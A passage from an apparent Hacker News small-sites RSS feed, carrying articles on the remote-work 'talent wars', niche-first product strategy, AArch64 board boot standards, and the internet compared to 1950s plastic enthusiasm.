<p>Abot anonymous poll with private answers</p>

</article>

<p><a href="https://twitter.com/_pawurb" target="_blank" rel="nofollow">
<img loading="lazy" alt="Pawel Urbanek Twitter account" title="Pawel Urbanek Twitter account" src="https://pawelurbanek.com/assets/pawel-circle-eafe4e7f9c98c20c753dcba1f1b1a16ed8bc384cdf2da91d272dd2291d8e7a4d.jpg" srcset="https://pawelurbanek.com/assets/pawel-circle-eafe4e7f9c98c20c753dcba1f1b1a16ed8bc384cdf2da91d272dd2291d8e7a4d.jpg 1x, https://pawelurbanek.com/assets/pawel-circle@2x-352753604906054aa864cc5f3916317be7c2b7db8f8703243a0447d06187c641.jpg 2x">
</a>
</p>

<br>

<br>

<br>


<br>





</div>
</div>
</div></div>]]>
            </description>
            <link>https://pawelurbanek.com/dangerous-word-slack</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222529</guid>
            <pubDate>Mon, 22 Feb 2021 09:41:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Welcome to the Talent Wars]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222479">thread link</a>) | @artpi
<br/>
February 22, 2021 | https://deliber.at/2021/talent-wars/ | <a href="https://web.archive.org/web/*/https://deliber.at/2021/talent-wars/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<p>This is an issue of my newsletter focusing on the psychological and technical aspects of the Internet, particularly remote work, online economy, and cognitive load. <a href="#signup">Sign up below to join the club</a></p>
<p>I believe (and hope) that the war as we know it is fundamentally an outdated concept. Jurisdictions (like Miami) will compete to attract talent, but that is not good news for unskilled labor, like gig workers.</p>



<ol><li>When we were fighters, we were fighting over herds of game and their territory,</li><li>Then, the agricultural revolution came. The most important asset became fertile land, and the wars were fought over that.</li><li>After the Scientific Revolution, we learned to process raw resources like metals, coal, and later oil.</li><li>We are now experiencing the digital revolution. The new resource is going to be talent and talent is not easily captured in traditional warfare.</li></ol>



<figure><table><thead><tr><th><strong>Value</strong></th><th><strong>After Revolution</strong></th><th><strong>What are wars fought over</strong></th><th><strong>Countries that benefit</strong></th></tr></thead><tbody><tr><td>Fertile land</td><td>Agricultural revolution</td><td>Land &amp; peasants<br><em>You want to conquer easily arable land</em></td><td>Fertile Crescent, Mediterranean<br></td></tr><tr><td>Mined Resources (Metals, Oil)</td><td>Scientific Revolution</td><td>Resource-rich land</td><td>Colonial powers, plus resource-rich countries like Germany and the USA</td></tr><tr><td>Talent</td><td>Digital revolution</td><td>No wars, but hostile takeovers of talent</td><td>Anybody who started educating in STEM like crazy 10 years ago</td></tr></tbody></table></figure>



<h2>Two classes of employees.</h2>



<p>Remote Work transition is certainly accelerating, but not everybody is benefitting from this situation. It has also lead to a new sort of class divide:</p>



<ul><li>“<strong>Talent</strong>” – highly skilled, and specialized experts that are constantly honing their craft and navigating the changing demands of the job market. During lockdowns, these people are known as the “<strong>Zoom Class</strong>” (because they can ride out the pandemic while working over zoom).</li><li>“<strong>Gig workers</strong>“, who we treat as a utility, and depend on to provide us with the endless stream of Amazon purchases and Uber Eats orders. Also known as the “<strong>Heroes</strong>“</li></ul>



<blockquote><p><em>Nick Rimedio, who serves on the West Hollywood Chamber of Commerce, said the lockdowns had widened a class divide. While quarantine has been almost relaxing for what he called the wealthy <strong>“Zoom class,”</strong> it has been a nightmare for the poor and middle class who have storefronts or work service jobs in businesses in the area, he said. </em></p><cite><a href="https://www.nytimes.com/2021/02/19/business/newsom-coronavirus-california.html">New York Times</a></cite></blockquote>



<h2>Talent is the new Oil</h2>



<p>Automation is coming after our jobs, and <a href="https://piszek.com/2020/06/18/how-to-protect-your-job-from-automation/">I have written before how to protect yourself against that.</a> But in the meantime, workers take time to train. With technological progress, complexity in many industries is unfathomable and requires highly trained labor. Which takes time, and can be rushed only to a point.</p>



<p>Training somebody to do basic programming tasks can be done in 6 months, but the way of thinking about the world needed to succeed in the information economy takes years to acquire.</p>



<p>We are post-scarcity on almost everything else, and I believe the talent will be the new frontier.</p>



<p><strong>On the commodity metaphor</strong></p>



<p>While drafting this newsletter, I wanted to compare “Gig Workers” to commodity and “Talent” to differentiable products. But I don’t think that’s entirely correct. There is a huge pool of the talent group that has commodity-like properties.</p>



<p>The majority of tech workers are uniform and replaceable enough. I’m sure that’s the case in many other specialized fields – creme de la creme will be irreplaceable, but the others will eventually be automated away.</p>



<h2>The promised talent wars</h2>



<p>War is a bit of a clickbait, but various initiatives around the world are trying to capitalize on the location independence of the “Talent” group.</p>



<ul><li>When you bring together talented people who like to create things, Startups &amp; new industries will take care of themselves. We have seen this in Florence, Venice, Paris, and later New York and Silicon Valley</li><li>These people tend to be compensated well (an argument can be made that unfairly so), which means higher tax revenue</li><li>They also have more discretionary income, some of which they will spend locally,</li><li>Children of educated&amp;motivated people tend to turn out the same way. This is a flywheel for the community.</li></ul>



<h3>Miami</h3>



<p>For a while now, Silicon Valley is downright hostile to the tech industry, behaving like an abusive partner that took your passport. Lockdowns took away any benefit of staying in San Francisco (meetups, conferences, and chance encounters), and multiple tech giants have adopted Remote Work (latest big news is <a href="https://newsroom.spotify.com/2021-02-12/distributed-first-is-the-future-of-work-at-spotify/">Spotify</a> pointing out that “Work isn’t something our people come to the office for, it’s something they do”).</p>



<p>Francis Suarez, the mayor of Miami jumped on the chance of turning the city into a tech hub and his efforts are inspiring. He is personally helping tech influencers move to his constituency, and now he’s reaching out to SV employees by the means of a billboard. In San Francisco.</p>



<figure><a href="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?ssl=1" target="_blank" rel="noopener"><img data-attachment-id="1327" data-permalink="https://deliber.at/2021/talent-wars/image-3-2/" data-orig-file="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?fit=1280%2C720&amp;ssl=1" data-orig-size="1280,720" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="image-3" data-image-description="" data-medium-file="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?fit=600%2C338&amp;ssl=1" data-large-file="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?fit=900%2C506&amp;ssl=1" loading="lazy" width="900" height="506" src="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?resize=900%2C506&amp;ssl=1" alt="" title="" srcset="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?w=1280&amp;ssl=1 1280w, https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?resize=600%2C338&amp;ssl=1 600w, https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/image-3.png?resize=768%2C432&amp;ssl=1 768w" sizes="(max-width: 900px) 100vw, 900px" data-recalc-dims="1"></a></figure>



<blockquote><p><em>“Thinking about moving to Miami? DM me”.</em></p></blockquote>



<p>I’m not able to put together a coherent sentence about how transformative can it be to have supportive, effective, and accessible local legislation. Books will be written about the emergence of the Miami tech hub.</p>



<h2>It’s not only about talent. It’s a fight for taxes</h2>



<p>Municipalities seeking tax revenue is of course nothing new. But traditionally, the way to do that was to create jobs, which would both provide income to residents and attract talent.</p>



<p>Remote Work is changing that. Having a job in one place, and living in another is now possible, and something I myself practice. But in this new world, how do cities fight for taxes? Are they even entitled? The problem is already here.</p>



<h3>Japan’s home tax</h3>



<p>Every country with a “superstar” city has this problem: smaller towns are investing in family-friendly infrastructure and education, only to see its citizens move to the one superstar city and continue paying taxes there.</p>



<p>Japan has an interesting solution, called ふるさと納税 (Furusato Nouzei or, roughly, the Hometown Tax System). In an interesting quirk, a taxpayer can select a town at her discretion, and the towns started to compete on “gifts” they would send to incentivize choosing their municipality for the ‘donation.’ From Patrick Mckenzie:</p>



<blockquote><p><em>The three farming communities we’re using all had a monthly subscription option for things produced locally, and they sound like e.g. “A rotating box of seasonal fruits produced in our town. Here’s the schedule: January, 500g of… February, a box of… The aesthetics of that are brilliant; fruit on our table will have come *from a place.* The economics are brilliant; probably half of the fruits are things we, like a typical Japanese family, wouldn’t generally choose to eat in a year.</em></p></blockquote>



<p>For a while, cities even offered a “kickback” in the form of travel vouchers and other cach equivalents. Government had to put a stop to it in 2019. Read more in <a href="https://www.kalzumeus.com/2018/10/19/japanese-hometown-tax/">this essay</a> and <a href="https://twitter.com/patio11/status/1330413522715598851">Tweetstorm</a> for an incentive-exploration filled ride.</p>







<figure><img data-attachment-id="1330" data-permalink="https://deliber.at/2021/talent-wars/zrzut-ekranu-2021-02-22-o-10-07-41/" data-orig-file="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/Zrzut-ekranu-2021-02-22-o-10.07.41.png?fit=831%2C963&amp;ssl=1" data-orig-size="831,963" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Zrzut-ekranu-2021-02-22-o-10.07.41" data-image-description="" data-medium-file="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/Zrzut-ekranu-2021-02-22-o-10.07.41.png?fit=518%2C600&amp;ssl=1" data-large-file="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/Zrzut-ekranu-2021-02-22-o-10.07.41.png?fit=831%2C963&amp;ssl=1" loading="lazy" width="831" height="963" src="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/Zrzut-ekranu-2021-02-22-o-10.07.41.png?resize=831%2C963&amp;ssl=1" alt="" srcset="https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/Zrzut-ekranu-2021-02-22-o-10.07.41.png?w=831&amp;ssl=1 831w, https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/Zrzut-ekranu-2021-02-22-o-10.07.41.png?resize=518%2C600&amp;ssl=1 518w, https://i1.wp.com/deliber.at/wp-content/uploads/sites/3/2021/02/Zrzut-ekranu-2021-02-22-o-10.07.41.png?resize=768%2C890&amp;ssl=1 768w" sizes="(max-width: 831px) 100vw, 831px" data-recalc-dims="1"><figcaption>Furusato-tax.jp is a comparison site that lets you browse the best offers for the “thank you” tokens. Caviar? Wagyu beef? Sushi? They got you covered. This wouldn’t be possible without the Internet.</figcaption></figure>







<h2>Specialized cities</h2>



<p>Just as Japan’s towns are specializing in Wagyu-beef-for-tax-donation schemes, other cities are seeking to attract Nomads and professionals:</p>



<ul><li><a href="https://www.mirror.co.uk/travel/europe/madeira-digital-nomads-village-remote-23509221">Madeira is building a nomad village</a></li><li><a href="https://www.bloomberg.com/news/articles/2021-02-19/-everyone-s-here-microstate-is-unlikely-hub-for-youtube-stars">Andorra is attracting Youtubers</a></li></ul>



<h2>What will happen next?</h2>



<p>Each of the revolutions outlined at the beginning of this post has shifted economic opportunities from incumbents to new countries:</p>



<ul><li>The agrarian revolution has brought prosperity to those with fertile land and water access</li><li>The industrial revolution brought demand for steel, potassium, and eventually, oil, which meant prosperity for Germany and the USA</li><li>The Digital revolution will shift the production centers to places abundant in highly educated and motivated workers,</li></ul>



<p>Two countries in particular are well positioned to benefit from this new world order:</p>



<ul><li>China, which has a head start because the industry has already shifted here,</li><li>India, which I’m especially optimistic about, because of their proficiency in English. Programming languages are all modeled after English grammar and English is already lingua franca. For better or worse.</li></ul>



<p>Since I like having skin in the game, I’m investing in the Indian stock exchange. I started <a href="https://www.reddit.com/r/ETFs/comments/la84li/how_would_you_bet_on_india/">this thread on Reddit, and people shared great pointers.</a> One thing I took away from <a href="https://deliber.at/2021/january-tea-party/">GameStop</a> is that Reddit has sold financial advice.</p>



<p>While the world order will be reshuffled, cities will specialize in attracting a certain kind of worker, with unique preferences. The concentration of artists and professionals in cities like Florence has led to Renaissance, and I hope it will lead to something good this time as well.</p>



<p>And I also hope we’ll find a way to trickle down these benefits to gig workers too. Wars may be over, but revolutions can turn out bloody too.</p>

			<div>
				<h4 id="signup">Sign up to get Deliberate Internet straight to your inbox</h4>
				<p>I write about the psychological and technical aspects of the Internet, focusing on remote work, online economy, and cognitive load. Every monday.</p>
				




			</div>
					</div><div>
		<p><img alt="" src="https://secure.gravatar.com/avatar/052eff51d6e5061c179cfb4cdf36fe14?s=60&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/052eff51d6e5061c179cfb4cdf36fe14?s=120&amp;d=mm&amp;r=g 2x" height="60" width="60" loading="lazy">		</p><!-- .author-avatar -->

		<!-- .author-heading -->

		<p>
			During the day I help build WordPress.com users earn from their sites.

But on nights and weekends, I indulge in my psychology + computer science education to promote remote work and deliberate approach to technology.

I write about corporate politics, leadership and hacking your habits to achieve a better lifestyle.
One of my favorite hacks is Remote Work.			<a href="https://deliber.at/author/artpi/" rel="author">
				View all posts by artpi			</a>
		</p><!-- .author-bio -->
	</div></div>]]>
            </description>
            <link>https://deliber.at/2021/talent-wars/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222479</guid>
            <pubDate>Mon, 22 Feb 2021 09:33:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Start with a Niche]]>
            </title>
            <description>
<![CDATA[
Score 105 | Comments 35 (<a href="https://news.ycombinator.com/item?id=26222313">thread link</a>) | @tablet
<br/>
February 22, 2021 | https://fibery.io/blog/start-with-a-niche/ | <a href="https://web.archive.org/web/*/https://fibery.io/blog/start-with-a-niche/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>The most popular products don’t become mass popular overnight. It’s a process. Usually, their popularity is uneven, they are unknown in some niches, but very popular in other niches.</p><p>When you start a product, sometimes you know the niche already and can easily define target customers. However, in many cases, you just don’t and try to find the niche and this miraculous niche-market-fit. </p><p>One of the most common mistakes is to ignore niches and just try to attract all kinds of customers. It’s essential to find 1-2 ponds to start from and then expand to the other, larger, and more promising lakes and oceans 🚰 → 🛁 → 🌊.</p><p>Here are a couple, maybe surprising examples, that demonstrate how popular products took off. </p><h4>Electrical telegraph (1837)</h4><p>Its adoption was not easy, since it was not clear what are the benefits for commercial institutions. Stockbrokers and reporters got the benefits first. They understood that fast information transition increases efficiency and helps to get an edge. In a short term, all major news agencies and major stock markets were connected to the telegraph. </p><h4>Telephone (1876)</h4><p>Telephones were adopted by police departments and fire stations. Fast reaction to crime reports and fires was great, but the telegraph was not enough. You have to have two-ways communication to get some details that the sender maybe is not expecting to report initially. </p><h4>Phonograph (1877)</h4><p>Try to guess the first niche market for the phonograph. Rich music lovers? Nope. First phonographs were coin-machines in bars. Throw a nickel and enjoy Stephen Foster ballads.</p><h4>Car (1886)</h4><p>Cars are almost among the lucky exception to the niche rule. However, there was still one group of people in the USA that moved from horses to cars enormously fast — farmers. Cars just expanded the borders of farmers’ social life and business activities. Suddenly you can buy goods, not from a local dealer, but a dealer in a remote town (much cheaper). Suddenly you can visit a town and watch a movie. These benefits were not important for the urban population, for they were life-changers for the rural population. Nevertheless, cars were adopted in cities quite fast as well.</p><blockquote><p>In addition, the car delivered you to the door and was faster than a horse-and-buggy, thus allowing longer trips in shorter time. Farmers had traditionally felt guilty about taking such trips, even when the time was available. </p></blockquote><h4>Radio (1895)</h4><p>Radio was immediately adopted by the British Royal Navy, they thought that radio can speed up communication between ships and were right. Fun fact: in 1912 Titanic sent CQD (distress signal), however, <a href="https://www.nationalgeographic.com/history/article/why-titanic-first-call-help-not-sos-signal">radio receiver was turned off on the closest ship</a>:</p><blockquote><p>Meanwhile, the closest ship, Californian, didn’t receive Titanic’s distress calls at all. Its wireless operator had switched off his receiver and gone to bed after Phillips told him to shut up.</p></blockquote><h4>VisiCalc (Excel predecessor, 1979)</h4><p>First, it was adopted by accountants. Businessmen and analysts joined the party much later. Accountants just saw the value right away (and quite many people pirchased Apple II just to get <a href="https://thenewstack.io/how-visicalcs-spreadsheets-changed-the-world/">VisiCalc</a>):</p><blockquote><p>Like an accountant, I remember showing it to one around here and he started shaking and said, “That’s what I do all week. I could do it in an hour.” … I meet these people now, they come up to me and say, “I gotta tell you, you changed my life. You made accounting fun.”</p></blockquote><h4>Facebook (2004)</h4><p>Everybody knows that Facebook got its popularity in universities first. Everybody knows the rest of the story.</p><blockquote><p>Within 24 hours, 1,200 Harvard students had signed up, and after one month, over half of the undergraduate population had a profile. The network was promptly extended to other Boston universities, the Ivy League and eventually all US universities</p></blockquote><hr><p>Can you start without any niche in mind? Yes, you can, but this is just hard. The most problematic part is marketing. Who are your ideal customers? How to reach them? How to target your message? <strong>Product is the message</strong>, so without proper marketing startup success chances are low. </p><h4>My experience</h4><p>In Fibery we did our first release in April 2020 as a general work management tool. We were not sure in what types of companies it will work better and what use cases will be more valuable. In just a month it became clear that we had all kinds of leads from all kinds of companies. Leads demanded all kinds of improvements that just didn’t form a sane strategy. </p><p>We quickly <a href="https://fibery.io/blog/chronicles-21/">decided to select a single niche and focus on it</a>. The niche we choose was product companies from 20 to 200 people. And it made everything much simpler. Finally, we can quite accurately say what features are important and what features are not so important, what is our value proposition, who is our ideal lead (Product Ops or CPO). It took us 9 months to prepare the <a href="https://fibery.io/product-management">second release</a>, but in this niche Fibery can fly much better, I believe. </p><p>OK, niche strategy looks convincing, but how to find the niche? We used <a href="https://en.wikipedia.org/wiki/Conway%27s_law">Conway’s law</a>, and it’s just partially a joke. We’ve reviewed a couple of alternatives and selected one we knew best and were confident that our product will provide a significant value boost. There were other alternatives, like education space or digital agencies space, but our knowledge here was not deep enough. It means we should rely on some domain experts, etc. It’s not a huge problem, but we also did not feel that these niches are better.</p><p>A startup should be an experimentation facility that hypothesizes, executes, and measures the results. The faster you can do it, the faster you find your niche. Why it took us 9 months to make this niche release? In fact we spend time to create a niche-probing framework. Now we can asseble solutions for various niches in 1-2 weeks and check initial response in 1-2 months. If the first niche will not be successful, we at least have a decent experimentation framework 🧬.</p></section></div>]]>
            </description>
            <link>https://fibery.io/blog/start-with-a-niche/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222313</guid>
            <pubDate>Mon, 22 Feb 2021 09:05:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[AArch64 Boards and Perception]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222300">thread link</a>) | @pabs3
<br/>
February 22, 2021 | https://marcin.juszkiewicz.com.pl/2021/02/22/aarch64-boards-and-perception/ | <a href="https://web.archive.org/web/*/https://marcin.juszkiewicz.com.pl/2021/02/22/aarch64-boards-and-perception/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Recently I had a discussion with A13 and realized that people may have
different perception of how AArch64 boards&nbsp;work:</p>
<blockquote>
<p>Sahaj told me that you can just install generic images on&nbsp;honeycomb</p>
<p>it kinda blows my&nbsp;mind</p>
</blockquote>
<p>How did we got to that&nbsp;point?</p>
<h3>Servers are boring,&nbsp;right?</h3>
<p>I started working on AArch64 in 2012. First in fast models written by Arm
developers, then also in <span>QEMU</span>. Both used direct kernel boot method without any
firmware or&nbsp;bootloaders.</p>
<p>In 2013 I moved from Canonical/Linaro to Red Hat. And there we got server from
Applied Micro. I do not remember how it booted as I used it for building
software. Some time later we had Mustangs and all of them were booting <span>UEFI</span>.</p>
<p>Then <a href="https://marcin.juszkiewicz.com.pl/2014/06/10/aarch64-is-in-the-house/">I got Mustang at home</a>. 
Fedora, <span>RHEL</span> were booting fine. Then CentOS and Debian joined. All of them
used grub-efi like my x86-64 desktop or&nbsp;laptop.</p>
<p>Time passed, I got other servers to work with. HPe M400, ThunderX, ThunderX2,
Falkor, D05 etc. Each of them was running <span>UEFI</span>. Either Tianocore based or
commercial&nbsp;one.</p>
<p>And to install operating system all I needed was to boot generic install&nbsp;media.</p>
<h3><span>SBC</span>&nbsp;hell</h3>
<p>At same time <span>SBC</span> world was fighting with users. Each vendor/SoC/board had to be
treated specially as there was no way to store firmware on board (as <a href="https://marcin.juszkiewicz.com.pl/2020/01/29/the-most-expensive-chip-in-the-arm-world/"><span>SPI</span> flash is
very expensive</a>).</p>
<p>So depending on <span>SBC</span> your firmware could be written&nbsp;either:</p>
<ul>
<li>at some special offset from start of microSD&nbsp;card</li>
<li>at the beginning of a partition of special&nbsp;type</li>
<li>in a file on vfat partition of any&nbsp;type</li>
<li>in a file on <span>EFI</span> System Partition (also using&nbsp;vfat)</li>
</ul>
<p>Some offsets forced the use of “obsolete” <span>MBR</span> partitioning as there was no space
for <span>GPT</span> information. While <span>UEFI</span> systems require <span>GPT</span> not <span>MBR</span>.</p>
<p>It also generated lot of wrong information like “this file needs to be named in
<span>UPPERCASE</span> (on case insensitive filesystem)” or “needs to be first file written
to a partition”. Some kind of “<span>SBC</span> boot&nbsp;voodoo”.</p>
<p>So each <span>SBC</span> required its own boot media — you could not take it to a board with
some other SoC and expect it to start. Or you spend some time to create some
kind of hybrid image which had a few bootloaders written. Easier way was to
prepare a separate boot media images per <span>SBC</span>.</p>
<p>From time to time there was <span>SBC</span> with onboard flash available for storing
firmware. Some people made use of it, others continued doing offset crap as they
were used to&nbsp;it.</p>
<h3><span>SBBR</span>, <span>EBBR</span>&nbsp;came</h3>
<p>Last years brought us several specifications from Arm. First was <span>SBBR</span> which
stands for Server Base Boot Requirements. It said which features should be
present in firmware (you can read more in <a href="https://marcin.juszkiewicz.com.pl/2020/10/12/standards-in-arm-space-part-i/">my previous post about Arm
standards</a>).</p>
<p>As SBCs are not servers, a new specification was created for them: <span>EBBR</span> (E means
Embedded). It basically says “try to follow what server does” and has some
requirements either dropped or&nbsp;relaxed.</p>
<p>Both were designed to make distribution’s life easier. Never mind is it <span>BSD</span>,
Linux or Microsoft Windows — they have to put <span>EFI</span> bootloader (like Grub-efi) in
<span>EFI</span> System Partition and system will boot on any supported <span>SBBR</span>/<span>EBBR</span>&nbsp;hardware.</p>
<p>For example I have a <span>USB</span> pendrive with Debian “bullseye” installed. It boots
fine on RockPro64 and Espressobin SBCs (both have <span>EBBR</span> compliant U-Boot stored
in on-board flash) and on Mustang and HoneyComb (both with <span>SBBR</span> compliant <span>UEFI</span>
in on-board&nbsp;flash).</p>
<h3>Habits. Good, bad,&nbsp;forced.</h3>
<p>So it looks like the way how AArch64 system should boot depends on what your
habits&nbsp;are.</p>
<p>When you started from servers then <span>SBBR</span>/<span>EBBR</span> way is your way and you look weird
at most of <span>SBC</span> systems with their offsets and “other mumbo&nbsp;jumbo”.</p>
<p>If all you used were <span>SBC</span> then going into <span>SBBR</span>/<span>EBBR</span> world can be “zOMG, it just
magically&nbsp;works!”.</p>
<h3>Note to <span>SBC</span>&nbsp;vendors</h3>
<p>Most SBCs already follow the <span>EBBR</span> standard or can easily be made compliant.
Never mind you are using mainline U-Boot or some own fork (and then consider
upstreaming as board’s life may be longer than you&nbsp;expect).</p>
<p>Enable the CONFIG_DISTRO_DEFAULTS option in the config. Build U-Boot, store it
to the board and boot. Then erase whatever environment you used before with “env
default -a”&nbsp;command.</p>
<p>On next reboot your <span>SBC</span> will iterate over “boot_targets” variable and check
for few standard boot&nbsp;files:</p>
<ul>
<li>extlinux/extlinux.conf</li>
<li>boot.scr.uimg</li>
<li>boot.scr</li>
<li>/efi/boot/bootaa64.efi</li>
</ul>
<p>When it gets something then it handles that and boots. If not then goes to
another boot&nbsp;target.</p>
<p>This allows to handle basically every operating system used on Arm systems.
And allows to boot generic install <span>ISO</span> (as long as <span>OS</span> on it supports the&nbsp;device).</p>
<p>Bonus points if your <span>SBC</span> has some on board flash or eMMC it can boot from. Then
firmware can be stored there so user does not even have to worry about&nbsp;it.</p>
	</div></div>]]>
            </description>
            <link>https://marcin.juszkiewicz.com.pl/2021/02/22/aarch64-boards-and-perception/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26222300</guid>
            <pubDate>Mon, 22 Feb 2021 09:03:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Internet is made of plastic]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26222197">thread link</a>) | @jaspax
<br/>
February 22, 2021 | https://jsbangs.com/2011/01/09/the-internet-is-made-of-plastic/ | <a href="https://web.archive.org/web/*/https://jsbangs.com/2011/01/09/the-internet-is-made-of-plastic/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-518" itemscope="" itemtype="http://schema.org/BlogPosting" itemprop="blogPost">
	

	<div itemprop="articleBody">
				<p>We’ve all seen <i>The Graduate</i>, right? And we’ve all seen that famous scene where the old guy tells the young depressed guy that he should get into plastics, because there’s a great future in plastics? If you have been living in an underground bunker waiting for the end of the world for the past forty years and haven’t had time to brush up on your pop culture, here’s a refresher:</p>
<p><span><iframe width="800" height="450" src="https://www.youtube.com/embed/DHGCvJjat1E?version=3&amp;rel=1&amp;showsearch=0&amp;showinfo=1&amp;iv_load_policy=1&amp;fs=1&amp;hl=en&amp;autohide=2&amp;wmode=transparent" allowfullscreen="true" sandbox="allow-scripts allow-same-origin allow-popups allow-presentation"></iframe></span></p>
<p>We all know why this scene is funny. It’s not because the old guy’s advice is wrong–on the contrary, plastics would be an excellent industry for a young college graduate to make money and build a solid career. Rather, it’s because it’s <i>plastic</i>, man. Plastic, the symbol of artificiality and artifice, of soulless corporate industrialism and estrangement from wilderness, the destruction of the environment and the victory of consumer conformity, the opposite of nature and freedom and apple pie and having sex with your girlfriend’s mother and all of the other good and wholesome things that <i>The Graduate</i> stands for.</p>
<p>However, not too many years before <i>The Graduate</i>, plastic had an entirely different connotation. In the 30’s and 40’s bakelite plastic was used in luxury items from jewelry to handrails–heck, vintage bakelite jewelry from those eras 30’s and the 40’s can <i>still</i> fetch a decent price on eBay. Disney World had <a href="http://www.retrofuture.com/index.php/2009/01/21/people-who-live-in-plastic-houses-can-throw-stones-2/">a plastic demonstration “Home of the Future”</a> in which almost everything was made of plastic (and which proved to be nearly indestructible, as described in the linked article). Plastic was touted as the material of the future for everything from furniture to footwear. But most importantly, plastic was <i>new</i>, plastic was The Future, and there is nothing more good, wholesome, and American than The Future.</p>
<figure><a href="http://www.retrofuture.com/wp-content/uploads/waterprooffurniture.gif"><img alt="A future housewife cleans her couch with a hose" src="https://i1.wp.com/www.retrofuture.com/wp-content/uploads/waterprooffurniture.gif" title="Hosing down the furniture" width="400" height="227"></a><figcaption>The couch is made of plastic. At one point people thought this was a good idea.</figcaption></figure>
<p><i>The Graduate</i> came out in 1967, putting it near the beginning of the backlash against plastic that grew throughout the 60’s and the 70’s, and which by now has simply become part of our cultural background. Today, we regard the old enthusiasm for plastic as quaint and naïve, or at worst slightly evil. (Plastic is bad for the environment, after all.) It took approximately 30 years for plastic to go from being The Future to being something a crufty old man tells you to get into at a depressing cocktail party. In 1952 being against plastic was to be a hidebound reactionary. (Are you <i>against The Future</i>?) But in 1967, being against plastic was to be a progressive, a man of good taste, and on the vanguard of things to come.</p>
<p>But I didn’t really come here to talk about plastic. Instead I want to talk about the internet. Because unlike plastic, the internet is <i>new</i>. The Intenet is The Future.</p>
<p>If you want to know why the internet is The Future, you should just read <a href="http://www.shirky.com/">Clay Shirky</a>. If you don’t have time to read all of Shirky’s articles, you could just read <a href="http://www.codinghorror.com/blog/2008/05/its-clay-shirkys-internet-we-just-live-in-it.html">Jeff Atwood on Clay Shirky</a> or <a href="http://boingboing.net/2010/06/10/clay-shirkys-cogniti.html">Cory Doctorow on Clay Shirky</a>, as they all say pretty much the same thing. Basically, things used to be terrible, because there wasn’t an internet. People had to consume mass-market media and professional journalism and had no place to put pictures of their cats. Now, however, we have an internet, so <i>everyone</i> can make videos on YouTube and be a blog journalist and amuse us with cat pictures, hilariously captioned.</p>
<p>And in reality, this <i>is</i> pretty cool. YouTube amuses me at least as often as network TV used to, Wikipedia is far more useful than any dead-tree encyclopedia, Facebook keeps me in touch with family that I would otherwise rarely talk to, I wouldn’t be writing a blog without the internet, and I’ve even been known to LOL at the odd cat every now and again. I don’t dispute the massive utility of the internet, and the advantages it offers over older means of communication. However, when I read the glowing, ecstatic pronouncements of the internet evangelists (and Shirky is only one, and not even the most hyperbolic), I get this queasy feeling of deja-vu. See, we’ve been promised The Future before.</p>
<p>So here’s my prediction: in the future, the internet enthusiasm of the 90’s and 00’s will seem as quaint and misplaced as the plastic enthusiasm of the 50’s.</p>
<p>Note what this does <i>not</i> predict. I am not predicting that the internet will go away or become less important. The people who predicted that plastic would be everywhere turned out to be correct: at least half of the things on my desk right now are made out of plastic, and I suspect that it’s literally impossible to go a day in America without using a plastic product of some kind. In the same way, the future internet will probably be more ubiquitous, more limitless, and more inescapable than it is now. But this very inescapability may destroy our earlier enthusiasm for it. Once the internet has ceased to be The Future and become the present, we’ll become keenly aware of its limitations and downsides, and attuned to the laments over what we’ve lost by giving in to a world of total connectivity.</p>
